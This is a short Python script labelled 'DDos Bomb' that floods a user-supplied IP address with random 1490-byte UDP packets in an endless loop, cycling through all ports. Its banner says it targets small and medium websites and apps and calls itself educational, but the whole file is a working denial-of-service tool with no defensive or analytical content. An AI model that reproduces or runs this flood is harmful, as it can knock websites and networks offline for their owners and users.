import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("DDos Bomb by @sergitnsr")
print("Targeted for small and medium websites and apps")
print("Adapted only for educational purposes!")
print("If executed in local network, may turn down the wifi")

ip = None
if ip not in ['1']:
    ip = raw_input('IP Target: ')
port = input("Port: ")

os.system("clear")
print("Starting DDoS")
print ("[        ] 0% ")
time.sleep(1)
print ("[====    ] 50%")
time.sleep(1)
print ("[========] 100%")
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port: %s")%(sent,ip,port)
     if port == 65534:
       port = 1